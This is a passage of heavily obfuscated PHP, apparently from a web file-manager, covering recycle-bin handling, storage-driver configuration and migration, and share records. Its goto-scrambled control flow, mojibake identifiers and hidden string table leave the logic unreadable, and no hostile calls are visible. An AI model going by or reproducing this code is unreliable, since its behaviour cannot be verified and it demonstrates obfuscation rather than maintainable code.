bìƒÛíâı†; Cª≥Ìø·ì: } private function restoreFolderChildren($D≈ïõ≠˜·è, $b¨«∞◊‹ƒ ) { goto C´∆†Ç–Óü; C´∆†Ç–Óü: $d•ÜáŸ—≥® =& $_SERVER[ú∫]; $DÁﬂÚ€ªÎµ = Model($d•ÜáŸ—≥®[1206]); $aÜöÌ€ß ¬ = array($d•ÜáŸ—≥®[395] => array($d•ÜáŸ—≥®[7], array())); goto CÍºãè⁄†ÿ; Fªçí ßÔÉ: $aÜöÌ€ß ¬[$d•ÜáŸ—≥®[395]][1] = array_unique($aÜöÌ€ß ¬[$d•ÜáŸ—≥®[395]][1]); $aÜöÌ€ß ¬[$d•ÜáŸ—≥®[957]] = $d•ÜáŸ—≥®[1779]; $DÁﬂÚ€ªÎµ->where($aÜöÌ€ß ¬)->setField($d•ÜáŸ—≥®[423], 1); goto bõÕ…‹Ò±ç; CÍºãè⁄†ÿ: foreach ($b¨«∞◊‹ƒ  as $b≤Œ†ãêπé) { if ($b≤Œ†ãêπé == $D≈ïõ≠˜·è) { continue; } if (!$DÁﬂÚ€ªÎµ->isParentOf($D≈ïõ≠˜·è, $b≤Œ†ãêπé)) { continue; } $e∂Éπ˜à£§ = $DÁﬂÚ€ªÎµ->sourceInfo($b≤Œ†ãêπé); if ($e∂Éπ˜à£§[$d•ÜáŸ—≥®[403]] == $d•ÜáŸ—≥®[87]) { $aÜöÌ€ß ¬[] = array($d•ÜáŸ—≥®[553] => array($d•ÜáŸ—≥®[512], $e∂Éπ˜à£§[$d•ÜáŸ—≥®[487]] . $b≤Œ†ãêπé . $d•ÜáŸ—≥®[513])); } else { $aÜöÌ€ß ¬[$d•ÜáŸ—≥®[395]][1][] = $b≤Œ†ãêπé; } } if (!$aÜöÌ€ß ¬[$d•ÜáŸ—≥®[395]][1]) { unset($aÜöÌ€ß ¬[$d•ÜáŸ—≥®[395]]); } if (!$aÜöÌ€ß ¬) { return; } goto Fªçí ßÔÉ; bõÕ…‹Ò±ç: } private function recycleMove($f…øÆÑ»Î“, $dÉ¬ªÜíæ¨ = 1) { $FæÔÌÉÑ∂ç =& $_SERVER[ú∫]; $EÎ÷∂ñåñ‘ = Model($FæÔÌÉÑ∂ç[1206]); $Fú’Ø≤Ôå„ = Model($FæÔÌÉÑ∂ç[1988]); $E“ÑÎÁΩÑ‚ = array($FæÔÌÉÑ∂ç[395] => $f…øÆÑ»Î“); if ($dÉ¬ªÜíæ¨) { $EÎ÷∂ñåñ‘->where($E“ÑÎÁΩÑ‚)->setField($FæÔÌÉÑ∂ç[423], 1); $Fú’Ø≤Ôå„->eventRecycle($f…øÆÑ»Î“, $FæÔÌÉÑ∂ç[1989]); } else { $búóÙüãëı = $EÎ÷∂ñåñ‘->where($E“ÑÎÁΩÑ‚)->find(); $cœ„áñº⁄ﬂ = $búóÙüãëı[$FæÔÌÉÑ∂ç[403]] == $FæÔÌÉÑ∂ç[87]; $cé›ôäá√› = $EÎ÷∂ñåñ‘->fileNameAuto($búóÙüãëı[$FæÔÌÉÑ∂ç[478]], $búóÙüãëı[$FæÔÌÉÑ∂ç[28]], REPEAT_RENAME_FOLDER, $cœ„áñº⁄ﬂ); if ($cé›ôäá√› != $búóÙüãëı[$FæÔÌÉÑ∂ç[28]]) { $EÎ÷∂ñåñ‘->rename($f…øÆÑ»Î“, $cé›ôäá√›); } $EÎ÷∂ñåñ‘->where($E“ÑÎÁΩÑ‚)->setField($FæÔÌÉÑ∂ç[423], 0); $Fú’Ø≤Ôå„->eventRecycle($f…øÆÑ»Î“, $FæÔÌÉÑ∂ç[1990]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\163\164\x6f\x72\141\147\x65\114\151\163\x74"; public $field = array("\156\141\x6d\145", "\163\x69\x7a\x65\x4d\141\170", "\163\171\x73\x74\x65\155", "\x64\x65\x66\141\165\154\x74", "\144\x72\151\166\145\162", "\143\157\156\146\x69\147"); public function listData($C±ñ•ª‚•Ü = false, $d€ÖÍ«áûÓ = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $DÉ©÷∫ÈÕﬁ = false) { $A§¨ñ¥∏…± =& $_SERVER[ú∫]; $FêÿŒËÏØ÷ = parent::listData($C±ñ•ª‚•Ü, $d€ÖÍ«áûÓ, $DÉ©÷∫ÈÕﬁ); if ($C±ñ•ª‚•Ü) { return $FêÿŒËÏØ÷; } $Dÿﬂ§Áäˆ÷ = $this->ioSizeUseGet(array_to_keyvalue($FêÿŒËÏØ÷, $A§¨ñ¥∏…±[33], $A§¨ñ¥∏…±[393])); foreach ($FêÿŒËÏØ÷ as $FÒ›µıﬁ˜‰ => $D—√ØèÑÃŒ) { unset($FêÿŒËÏØ÷[$FÒ›µıﬁ˜‰][$A§¨ñ¥∏…±[6]]); $FêÿŒËÏØ÷[$FÒ›µıﬁ˜‰][$A§¨ñ¥∏…±[1678]] = isset($Dÿﬂ§Áäˆ÷[$D—√ØèÑÃŒ[$A§¨ñ¥∏…±[393]]]) ? $Dÿﬂ§Áäˆ÷[$D—√ØèÑÃŒ[$A§¨ñ¥∏…±[393]]] : 0; } return $FêÿŒËÏØ÷; } public function ioSizeUseGet($f∆ë°“∫îª) { goto EÔ‘˜∞Í±ù; Eàãà¢‡Ë∂: $düŸ´®†æÃ = array($Eå≈º»‚ú§[782] => array($Eå≈º»‚ú§[7], $f∆ë°“∫îª)); $aïè˘¨±ë† = Model($Eå≈º»‚ú§[747])->field($aï¯∑çåâÒ)->where($düŸ´®†æÃ)->group($Eå≈º»‚ú§[782])->select(); $aïè˘¨±ë† = array_to_keyvalue($aïè˘¨±ë†, $Eå≈º»‚ú§[393], $Eå≈º»‚ú§[78]); goto f≤πèªåÙà; C∂ç‰‹âÁæ: $aïè˘¨±ë† = Cache::get($cœ—å‚Æ ú); if ($aïè˘¨±ë†) { return $aïè˘¨±ë†; } $aï¯∑çåâÒ = array($Eå≈º»‚ú§[782] => $Eå≈º»‚ú§[393], $Eå≈º»‚ú§[1992] => $Eå≈º»‚ú§[78]); goto Eàãà¢‡Ë∂; EÔ‘˜∞Í±ù: $Eå≈º»‚ú§ =& $_SERVER[ú∫]; if (!$f∆ë°“∫îª) { return array(); } $cœ—å‚Æ ú = $Eå≈º»‚ú§[1991] . implode($Eå≈º»‚ú§[47], $f∆ë°“∫îª); goto C∂ç‰‹âÁæ; f≤πèªåÙà: Cache::set($cœ—å‚Æ ú, $aïè˘¨±ë†, 600); return $aïè˘¨±ë†; goto EªÃ⁄—⁄©°; EªÃ⁄—⁄©°: } public function getConfig($F“´ÿÍ¢Úõ) { $eï€ºˆû™è = parent::listData($F“´ÿÍ¢Úõ); return json_decode($eï€ºˆû™è[$_SERVER[ú∫][6]], !0); } public function update($F’Üùê»ëÕ, $AÈ ªãŸ˘§) { goto FÏÃôçòóé; e¿÷ÿÂ˜≤¥: if (isset($fïùñØ§‚’[$fµå≤ò¿»Ü]) && $fïùñØ§‚’[$fµå≤ò¿»Ü][$cﬂÑ≈ÑÁêù[393]] != $F’Üùê»ëÕ) { return !1; } if (isset($AÈ ªãŸ˘§[$cﬂÑ≈ÑÁêù[1993]]) && $AÈ ªãŸ˘§[$cﬂÑ≈ÑÁêù[1993]] == $cﬂÑ≈ÑÁêù[87]) { $this->checkConfig($AÈ ªãŸ˘§); } unset($AÈ ªãŸ˘§[$cﬂÑ≈ÑÁêù[1993]]); goto d©åÙΩ…‚á; d©åÙΩ…‚á: $cØìöß£‹˜ = parent::update($F’Üùê»ëÕ, $AÈ ªãŸ˘§); if ($cØìöß£‹˜ && $AÈ ªãŸ˘§[$cﬂÑ≈ÑÁêù[34]]) { foreach ($fïùñØ§‚’ as $bØﬁ êè·°) { if ($bØﬁ êè·°[$cﬂÑ≈ÑÁêù[34]] && $bØﬁ êè·°[$cﬂÑ≈ÑÁêù[393]] != $F’Üùê»ëÕ) { parent::update($bØﬁ êè·°[$cﬂÑ≈ÑÁêù[393]], array($cﬂÑ≈ÑÁêù[34] => 0)); } } } return $cØìöß£‹˜; goto aï•¬´ì∆´; FÏÃôçòóé: $cﬂÑ≈ÑÁêù =& $_SERVER[ú∫]; $fµå≤ò¿»Ü = $AÈ ªãŸ˘§[$cﬂÑ≈ÑÁêù[28]]; $fïùñØ§‚’ = array_to_keyvalue(parent::listData(), $cﬂÑ≈ÑÁêù[28]); goto e¿÷ÿÂ˜≤¥; aï•¬´ì∆´: } public function add($E≥Ô‚≤—êå) { goto CÔã›ß…îê; e»∏•∞ÜÕÍ: return $eòë¿◊äÎÉ; goto b∫ø“ì·ÓÑ; fåÃ∏óﬁ¿œ: $this->checkConfig($E≥Ô‚≤—êå); $eòë¿◊äÎÉ = parent::insert($E≥Ô‚≤—êå); if ($eòë¿◊äÎÉ && $E≥Ô‚≤—êå[$BÑÑ¶À∫ºß[34]]) { foreach ($E‚Ûã’ÚÛÛ as $düÂÜì©ƒ•) { if ($düÂÜì©ƒ•[$BÑÑ¶À∫ºß[34]]) { parent::update($düÂÜì©ƒ•[$BÑÑ¶À∫ºß[393]], array($BÑÑ¶À∫ºß[34] => 0)); } } } goto e»∏•∞ÜÕÍ; CÔã›ß…îê: $BÑÑ¶À∫ºß =& $_SERVER[ú∫]; $E‚Ûã’ÚÛÛ = array_to_keyvalue(parent::listData(), $BÑÑ¶À∫ºß[28]); if (isset($E‚Ûã’ÚÛÛ[$E≥Ô‚≤—êå[$BÑÑ¶À∫ºß[28]]])) { return !1; } goto fåÃ∏óﬁ¿œ; b∫ø“ì·ÓÑ: } public function checkConfig(&$DÂõﬁå∞¶—, $aíØ›“Ã±Í = false) { goto FÇ¨í¨·ù»; DΩÜ‡†ûœ»: $D°à èÌ—€ = $E†Çá†®êâ->getPath($cºÉÂº¨€· . $CÌ»∏…Êã†[1138]); if (!$E†Çá†®êâ->mkfile($D°à èÌ—€)) { if ($aíØ›“Ã±Í) { return LNG($CÌ»∏…Êã†[1998]); } show_json(LNG($CÌ»∏…Êã†[1998]), !1); } $FøœìûœÚØ[$CÌ»∏…Êã†[1076]] = $cºÉÂº¨€·; goto e…ÊÕÂÉ⁄Û; E∂óØ€‚ö›: $E†Çá†®êâ = new $dÆÑ≤€‘…ä($FøœìûœÚØ); if (in_array($e©úÂ˘ú⁄É, $E†Çá†®êâ->objectDriver)) { if (!$E†Çá†®êâ->isBucketCors() && !$E†Çá†®êâ->setBucketCors()) { $FÁ»Üú™öÀ = LNG($CÌ»∏…Êã†[1998]); $FÁ»Üú™öÀ .= $CÌ»∏…Êã†[1999] . LNG($CÌ»∏…Êã†[2000]); if ($aíØ›“Ã±Í) { return $FÁ»Üú™öÀ; } show_json($FÁ»Üú™öÀ, !1); } } $cºÉÂº¨€· = rtrim($FøœìûœÚØ[$CÌ»∏…Êã†[1076]], $CÌ»∏…Êã†[8]) . $CÌ»∏…Êã†[8]; goto DΩÜ‡†ûœ»; bÁ«¶Û´Êº: foreach ($FøœìûœÚØ as $Dﬂàà˜∫ „ => $dœ‹≥¨•îä) { $FøœìûœÚØ[$Dﬂàà˜∫ „] = trim($dœ‹≥¨•îä); } $FøœìûœÚØ[$CÌ»∏…Êã†[1994]] = rand_string(6); $dˆó»√«Ω∫ = $GLOBALS[$CÌ»∏…Êã†[6]][$CÌ»∏…Êã†[88]][$CÌ»∏…Êã†[791]]; goto fÜèÒ◊å∂Ø; FÇ¨í¨·ù»: $CÌ»∏…Êã† =& $_SERVER[ú∫]; $e©úÂ˘ú⁄É = strtolower($DÂõﬁå∞¶—[$CÌ»∏…Êã†[94]]); $FøœìûœÚØ = json_decode($DÂõﬁå∞¶—[$CÌ»∏…Êã†[6]], !0); goto bÁ«¶Û´Êº; fÜèÒ◊å∂Ø: $AµµŸŒƒØÑ = isset($dˆó»√«Ω∫[$e©úÂ˘ú⁄É]) ? $dˆó»√«Ω∫[$e©úÂ˘ú⁄É] : ucfirst($e©úÂ˘ú⁄É); $dÆÑ≤€‘…ä = $CÌ»∏…Êã†[72] . $AµµŸŒƒØÑ; if (!$AµµŸŒƒØÑ || !class_exists($dÆÑ≤€‘…ä)) { if ($aíØ›“Ã±Í) { return LNG($CÌ»∏…Êã†[1995]); } write_log(array($CÌ»∏…Êã†[1996], $DÂõﬁå∞¶—, get_caller_info()), $CÌ»∏…Êã†[1997]); show_json(LNG($CÌ»∏…Êã†[1995]), !1, $DÂõﬁå∞¶—); } goto E∂óØ€‚ö›; e…ÊÕÂÉ⁄Û: $DÂõﬁå∞¶—[$CÌ»∏…Êã†[6]] = json_encode($FøœìûœÚØ); $DÂõﬁå∞¶—[$CÌ»∏…Êã†[94]] = $AµµŸŒƒØÑ; return !0; goto cÛòù–°øâ; cÛòù–°øâ: } public function driverListSystem() { $B»ó∫‘§õ€ =& $_SERVER[ú∫]; $d…¶÷—ø∆¿ = parent::listData(); $dëÆÿŸë€ù = array(); foreach ($d…¶÷—ø∆¿ as $C∂≤‰Üâü≤) { unset($C∂≤‰Üâü≤[$B»ó∫‘§õ€[194]], $C∂≤‰Üâü≤[$B»ó∫‘§õ€[84]]); $C∂≤‰Üâü≤[$B»ó∫‘§õ€[6]] = json_decode($C∂≤‰Üâü≤[$B»ó∫‘§õ€[6]], !0); $dëÆÿŸë€ù[] = $C∂≤‰Üâü≤; } return $dëÆÿŸë€ù; } public function defaultDriver() { $a≈◊∏…•õ˘ =& $_SERVER[ú∫]; $f°‘≈öõµî = parent::listData(); $BÏÖÂ˘íƒÖ = array_filter_by_field($f°‘≈öõµî, $a≈◊∏…•õ˘[34], 1); $BÏÖÂ˘íƒÖ = $BÏÖÂ˘íƒÖ[0]; if ($BÏÖÂ˘íƒÖ) { $BÏÖÂ˘íƒÖ[$a≈◊∏…•õ˘[6]] = json_decode($BÏÖÂ˘íƒÖ[$a≈◊∏…•õ˘[6]], !0); } return $BÏÖÂ˘íƒÖ; } public function driverInfo($béå›á°Èç) { $cœÈÖ¯À‹Î =& $_SERVER[ú∫]; $cµÍ◊ùÂ«Ê = array_to_keyvalue(parent::listData(), $cœÈÖ¯À‹Î[393]); if (!isset($cµÍ◊ùÂ«Ê[$béå›á°Èç])) { return !1; } $e≤ÌŒ·™˜§ = $cµÍ◊ùÂ«Ê[$béå›á°Èç]; $e≤ÌŒ·™˜§[$cœÈÖ¯À‹Î[6]] = json_decode($e≤ÌŒ·™˜§[$cœÈÖ¯À‹Î[6]], !0); return $e≤ÌŒ·™˜§; } public function remove($DÛ“ï≥ßñº) { $this->removeShareItems($DÛ“ï≥ßñº); return parent::remove($DÛ“ï≥ßñº); } public function removeWithFile($c´èïœûãò, $aπ…Î‹äıâ) { goto eè‹îã∏≠â; E¡å‰∆›Òè: $B¥Ø≥Ωùäü = Model($dÖÃ€ÕÂ¯”[450])->where($FÉÇ§É‰±)->sum($dÖÃ€ÕÂ¯”[78]); $fªé‚Õ˜ÆÕ = $aπ…Î‹äıâ . $dÖÃ€ÕÂ¯”[2001] . $c´èïœûãò; $A‹„’§≤√ë = new TaskFileTransfer($fªé‚Õ˜ÆÕ, $dÖÃ€ÕÂ¯”[1997], $BëÁÉï´…Õ, LNG($dÖÃ€ÕÂ¯”[2002]) . "\x28{$c´èïœûãò}\51"); goto B©‘◊ÈÿéÑ; e…áãËü⁄Ç: if (!$f⁄Ï•≥º«à) { $A‹„’§≤√ë->stop($fªé‚Õ˜ÆÕ); return !1; } $A‹„’§≤√ë->end(); if ($aπ…Î‹äıâ == $dÖÃ€ÕÂ¯”[1658]) { $this->remove($c´èïœûãò); } goto E÷Ëú‡ˆ«à; B©‘◊ÈÿéÑ: $A‹„’§≤√ë->task[$dÖÃ€ÕÂ¯”[723]] = (double) $B¥Ø≥Ωùäü; $B¡ì™‡îâí = KodIO::defaultDriver(); $E¬“≤¨ˆŒ = $B¡ì™‡îâí[$dÖÃ€ÕÂ¯”[393]]; goto D“ıÁôãÉ‹; cúâ≠∫•‡â: $f∏Ô»ãÑÀÏ = Model($dÖÃ€ÕÂ¯”[193])->where($FÉÇ§É‰±)->field($dÖÃ€ÕÂ¯”[2003])->select(); foreach ($f∏Ô»ãÑÀÏ as $CÖΩØ«…ÎÜ) { goto BÉ—Íöœùæ; BÉ—Íöœùæ: $fªÍò™∫¥‡ = $CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[76]]; $B∑õÇªí„™ = $BüÂ±º‚ˆê . str_replace("\x7b\151\x6f\x3a{$c´èïœûãò}\175\x2f", $dÖÃ€ÕÂ¯”[33], $fªÍò™∫¥‡); if (!IO::exist($fªÍò™∫¥‡)) { $fçíì©üﬂ÷[] = $CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[447]]; $A‹„’§≤√ë->updateFileEnd($CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[28]], $CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[78]]); continue; } goto FÂÁäïä©æ; FÂÁäïä©æ: if (IO::exist($B∑õÇªí„™)) { $A‹„’§≤√ë->updateFileEnd($CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[28]], $CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[78]]); continue; } if (!IO::move($fªÍò™∫¥‡, get_path_father($B∑õÇªí„™))) { $f⁄Ï•≥º«à = !1; break; } $FÉÇ§É‰± = array($dÖÃ€ÕÂ¯”[447] => $CÖΩØ«…ÎÜ[$dÖÃ€ÕÂ¯”[447]]); goto FëíõﬁÃﬁÊ; FëíõﬁÃﬁÊ: $b˘ª⁄ÑùöŒ = array($dÖÃ€ÕÂ¯”[782] => $E¬“≤¨ˆŒ, $dÖÃ€ÕÂ¯”[76] => $B∑õÇªí„™); Model($dÖÃ€ÕÂ¯”[193])->where($FÉÇ§É‰±)->save($b˘ª⁄ÑùöŒ); goto D¥È°Îôπı; D¥È°Îôπı: } $this->removeByFileID($fçíì©üﬂ÷); goto e…áãËü⁄Ç; D“ıÁôãÉ‹: $BüÂ±º‚ˆê = "\x7b\151\157\72{$E¬“≤¨ˆŒ}\175\57"; $f⁄Ï•≥º«à = !0; $fçíì©üﬂ÷ = array(); goto cúâ≠∫•‡â; eè‹îã∏≠â: $dÖÃ€ÕÂ¯” =& $_SERVER[ú∫]; $FÉÇ§É‰± = array($dÖÃ€ÕÂ¯”[782] => $c´èïœûãò); $BëÁÉï´…Õ = Model($dÖÃ€ÕÂ¯”[450])->where($FÉÇ§É‰±)->count(); goto E¡å‰∆›Òè; E÷Ëú‡ˆ«à: } public function progress($BùÏ’ı®Ôç, $F∂‚ˆ‡≥çã) { return Task::get($F∂‚ˆ‡≥çã . $_SERVER[ú∫][2001] . $BùÏ’ı®Ôç); } private function removeByFileID($A…π≤ﬂÜàÛ = array()) { goto cæ‡ëùöÈ; CÖà Â‹¿Œ: $Añë¢⁄ä√¨ = Model($b˘”Îø≥Ë»[1206])->where($EˆÙ ™∫‚ç)->field($b˘”Îø≥Ë»[395])->select(); if (!$Añë¢⁄ä√¨) { return; } $Añë¢⁄ä√¨ = array_to_keyvalue($Añë¢⁄ä√¨, $b˘”Îø≥Ë»[33], $b˘”Îø≥Ë»[395]); goto FñÁøæ∆œ›; cæ‡ëùöÈ: $b˘”Îø≥Ë» =& $_SERVER[ú∫]; if (empty($A…π≤ﬂÜàÛ)) { return; } $EˆÙ ™∫‚ç = array($b˘”Îø≥Ë»[447] => array($b˘”Îø≥Ë»[7], $A…π≤ﬂÜàÛ)); goto CÖà Â‹¿Œ; FñÁøæ∆œ›: foreach ($Añë¢⁄ä√¨ as $b≈ΩÎ∂†ë») { Model($b˘”Îø≥Ë»[409])->removeNow($b≈ΩÎ∂†ë», !1); } goto FâÛÇ«Éâå; FâÛÇ«Éâå: } private function removeShareItems($düã¿‡ë»®) { goto eÉÉ†—µÃ—; eÉÉ†—µÃ—: $bÍºé∫ÁÜÌ =& $_SERVER[ú∫]; $Bß¡†∑ç˘◊ = "\x7b\151\x6f\72{$düã¿‡ë»®}\x7d\x2f"; $e∏Ê∑∂§ü© = array($bÍºé∫ÁÜÌ[395] => 0, $bÍºé∫ÁÜÌ[1071] => array($bÍºé∫ÁÜÌ[380], "{$Bß¡†∑ç˘◊}\x25")); goto Dµ©Æ§Õ§Ñ; Dµ©Æ§Õ§Ñ: $aƒâ°ãÚäÌ = Model($bÍºé∫ÁÜÌ[1669])->where($e∏Ê∑∂§ü©)->field($bÍºé∫ÁÜÌ[468])->select(); if (empty($aƒâ°ãÚäÌ)) { return; } $FŒ®œ¡Ÿ™Ù = array_to_keyvalue($aƒâ°ãÚäÌ, $bÍºé∫ÁÜÌ[33], $bÍºé∫ÁÜÌ[468]); goto a›÷˘Ñ¬ìí; a›÷˘Ñ¬ìí: Model($bÍºé∫ÁÜÌ[563])->remove($FŒ®œ¡Ÿ™Ù); goto CÇ¶ÜÑ∏‚¯; CÇ¶ÜÑ∏‚¯: } } goto eèàå¿º¡à; C¢Ê¯õ©Àﬂ: define($_SERVER[ú∫][237], 2); define($_SERVER[ú∫][238], 3); define($_SERVER[ú∫][239], 1); goto C–≤ﬁùçíâ; c‰¡…«Ç°√: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\146\x79\x54\151\x6d\145", "\x74\151\155\145", "\151\x6e\163\x65\x72\164\54\x75\160\144\x61\164\145", "\x66\x75\x6e\x63\164\x69\x6f\156"), array("\x63\162\145\x61\x74\145\x54\x69\x6d\x65", "\164\151\155\x65", "\151\156\x73\145\x72\164", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\157\x70\x74\x69\157\156\x73", '', "\x69\156\163\x65\162\164\54\x75\x70\144\141\x74\x65\54\163\145\154\x65\143\x74", "\x6a\163\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($c∂Òµä«·ê) { $cˆı¥¬ìïÌ =& $_SERVER[ú∫]; $Aæ⁄áπÇÙÁ = isset($c∂Òµä«·ê[0]) ? $c∂Òµä«·ê[0] : !1; return array($cˆı¥¬ìïÌ[1820] => array(USER_ID, $cˆı¥¬ìïÌ[1821]), $cˆı¥¬ìïÌ[1764] => array($Aæ⁄áπÇÙÁ, $cˆı¥¬ìïÌ[1822])); } protected function listSimple() { $D‚¨ÕÒø∞ê = array($_SERVER[ú∫][1528] => USER_ID); $DÓ†µ”æª¬ = $this->field($this->fieldList)->where($D‚¨ÕÒø∞ê)->select(); return $DÓ†µ”æª¬ ? $DÓ†µ”æª¬ : array(); } protected function getInfo($Eˆççô⁄‰¿, $Dõé¥îìÆ§ = false) { $Aéúæâ¶ı∏ =& $_SERVER[ú∫]; if ($Dõé¥îìÆ§) { return $this->_getShareInfo(array($Aéúæâ¶ı∏[468] => $Eˆççô⁄‰¿)); } $AπÕÇœüäÃ = $this->cacheFunctionGet($Aéúæâ¶ı∏[1771], $Eˆççô⁄‰¿); return $AπÕÇœüäÃ; } public function getInfoByHash($a˘úπ◊∏∆¢) { return $this->_getShareInfo(array($_SERVER[ú∫][470] => $a˘úπ◊∏∆¢)); } public function getInfoByPath($c≤«Ç≥‘ØŸ) { $DÃõà⁄¥≠¢ =& $_SERVER[ú∫]; $bı¯“•¯∫Ã = array($DÃõà⁄¥≠¢[1528] => USER_ID, $DÃõà⁄¥≠¢[395] => $c≤«Ç≥‘ØŸ); return $this->_getShareInfo($bı¯“•¯∫Ã); } public function getInfoBySourcePath($Eﬂ©ΩÓﬂµë) { $bÃˆ⁄ØáêÃ =& $_SERVER[ú∫]; $a∆ø÷¨Ôìó = array($bÃˆ⁄ØáêÃ[1528] => USER_ID, $bÃˆ⁄ØáêÃ[1071] => $Eﬂ©ΩÓﬂµë); return $this->_getShareInfo($a∆ø÷¨Ôìó); } private function _getShareInfo($d≤∂ÌÀ∂âï) { goto f∏‘“êî˘®; AÂ´ß–ã·∑: if ($a∑•’º¥Ü¨[$BÜó‡öû∑§[395]] == $BÜó‡öû∑§[191]) { $a∑•’º¥Ü¨[$BÜó‡öû∑§[85]] = IO::info($a∑•’º¥Ü¨[$BÜó‡öû∑§[1071]]); } else { $a∑•’º¥Ü¨[$BÜó‡öû∑§[85]] = Model($BÜó‡öû∑§[1206])->pathInfo($a∑•’º¥Ü¨[$BÜó‡öû∑§[395]]); } $a∑•’º¥Ü¨[$BÜó‡öû∑§[1824]] = $bÒ÷«íöòË; return $a∑•’º¥Ü¨; goto fã™∏≤Øî≤; f∏‘“êî˘®: $BÜó‡öû∑§ =& $_SERVER[ú∫]; $a∑•’º¥Ü¨ = $this->where($d≤∂ÌÀ∂âï)->find(); if (!$a∑•’º¥Ü¨) { return !1; } goto Cèíú°‹ä ; Cèíú°‹ä : $d≤∂ÌÀ∂âï = array($BÜó‡öû∑§[468] => $a∑•’º¥Ü¨[$BÜó‡öû∑§[468]]); $aä√Ã… Ó∑ = $BÜó‡öû∑§[1823]; $bÒ÷«íöòË = Model($BÜó‡öû∑§[564])->order($BÜó‡öû∑§[393])->field($aä√Ã… Ó∑)->where($d≤∂ÌÀ∂âï)->select(); goto AÂ´ß–ã·∑; fã™∏≤Øî≤: } protected function getInfoAuth($C∫ëãñÙ÷Ü) { $a∏¯öç£à⁄ =& $_SERVER[ú∫]; $BÎÂß≈¬„ = $this->getInfo($C∫ëãñÙ÷Ü); $BÎÂß≈¬„[$a∏¯öç£à⁄[406]] = Model($a∏¯öç£à⁄[482])->authMake($BÎÂß≈¬„[$a∏¯öç£à⁄[1824]]); return $BÎÂß≈¬„; } protected function listData($C∏Ì∏¥ˆâŸ = null, $D≠øâ£Æﬂ± = 300) { $dî¶€£È‘‡ =& $_SERVER[ú∫]; $DéÎ›Ú©ßÔ = array(array($dî¶€£È‘‡[473] => array($dî¶€£È‘‡[969], 0), $dî¶€£È‘‡[475] => array($dî¶€£È‘‡[969], 0), $dî¶€£È‘‡[1825] => $dî¶€£È‘‡[1779])); if ($C∏Ì∏¥ˆâŸ == $dî¶€£È‘‡[1826]) { $DéÎ›Ú©ßÔ = array($dî¶€£È‘‡[473] => 1); } else { if ($C∏Ì∏¥ˆâŸ == $dî¶€£È‘‡[1056]) { $DéÎ›Ú©ßÔ = array($dî¶€£È‘‡[475] => 1); } } $DéÎ›Ú©ßÔ[$dî¶€£È‘‡[1528]] = USER_ID; $aÕ√ÂßáˆÇ = $this->where($DéÎ›Ú©ßÔ)->selectPage($D≠øâ£Æﬂ±); return $aÕ√ÂßáˆÇ; } protected function listToMe($eóÿŒˆÍ∞€ = 300) { goto f±÷â÷ò¯ø; B®Ñ≥•®Ì∞: if ($e¿™ÛÜﬁø) { $báâù©Ü»¨ = array(array($CË¨ÜÃÒ€ˆ[549] => SourceModel::TYPE_USER, $CË¨ÜÃÒ€ˆ[484] => USER_ID), array($CË¨ÜÃÒ€ˆ[549] => SourceModel::TYPE_GROUP, $CË¨ÜÃÒ€ˆ[484] => array($CË¨ÜÃÒ€ˆ[7], $e¿™ÛÜﬁø)), $CË¨ÜÃÒ€ˆ[1825] => $CË¨ÜÃÒ€ˆ[1779]); } $cóâ«¢…øÖ = Model($CË¨ÜÃÒ€ˆ[564])->where($báâù©Ü»¨)->selectPage($eóÿŒˆÍ∞€); $eıìéåÔΩµ = array_to_keyvalue_group($cóâ«¢…øÖ[$CË¨ÜÃÒ€ˆ[367]], $CË¨ÜÃÒ€ˆ[468]); goto d¿Ñ∑Ñõåã; AÆ≤Ëù∏õ‰: $d°ê®§«∂√ = $this->field($aÿ ‡Âëª)->where($báâù©Ü»¨)->select(); foreach ($d°ê®§«∂√ as $F™‚Àê€√Ã => &$AÌˆä›©Ê«) { $AÌˆä›©Ê«[$CË¨ÜÃÒ€ˆ[1824]] = $eıìéåÔΩµ[$AÌˆä›©Ê«[$CË¨ÜÃÒ€ˆ[468]]]; } unset($AÌˆä›©Ê«); goto b±Ã€êîÍ•; f±÷â÷ò¯ø: $CË¨ÜÃÒ€ˆ =& $_SERVER[ú∫]; $e¿™ÛÜﬁø = Model($CË¨ÜÃÒ€ˆ[1827])->userGroupParents(USER_ID); $báâù©Ü»¨ = array($CË¨ÜÃÒ€ˆ[549] => SourceModel::TYPE_USER, $CË¨ÜÃÒ€ˆ[484] => USER_ID); goto B®Ñ≥•®Ì∞; d¿Ñ∑Ñõåã: if (!$eıìéåÔΩµ) { return $cóâ«¢…øÖ; } $aÿ ‡Âëª = $CË¨ÜÃÒ€ˆ[1828]; $báâù©Ü»¨ = array($CË¨ÜÃÒ€ˆ[468] => array($CË¨ÜÃÒ€ˆ[411], array_keys($eıìéåÔΩµ))); goto AÆ≤Ëù∏õ‰; b±Ã€êîÍ•: $eÍ ÑÊöº‡ = array($CË¨ÜÃÒ€ˆ[1829] => $d°ê®§«∂√, $CË¨ÜÃÒ€ˆ[1830] => $cóâ«¢…øÖ[$CË¨ÜÃÒ€ˆ[364]]); return $eÍ ÑÊöº‡; goto F§øîê¯úÒ; F§øîê¯úÒ: } protected function shareAdd($Cæ®õ≠ë∆ù, $AªËä‹Ë‡≥) { $FÖ≥äÖŸ≤¨ =& $_SERVER[ú∫]; $eë‰õíÏﬁµ = $this->_addShareData($Cæ®õ≠ë∆ù, $AªËä‹Ë‡≥); if (!empty($AªËä‹Ë‡≥[$FÖ≥äÖŸ≤¨[1831]])) { $this->_shareAuthSet($eë‰õíÏﬁµ, $AªËä‹Ë‡≥[$FÖ≥äÖŸ≤¨[1831]]); } $this->shareEventAdd($Cæ®õ≠ë∆ù, $AªËä‹Ë‡≥, $FÖ≥äÖŸ≤¨[1059]); return $eë‰õíÏﬁµ; } private function shareEventAdd($cπ„∑¯Õ„í, $D∏Ö ¯Ì˘ó, $d¬≈…¿ç•ñ = "\x61\144\144") { goto eÛıñò Öó; eÛıñò Öó: $D¬ëçÃ™∂€ =& 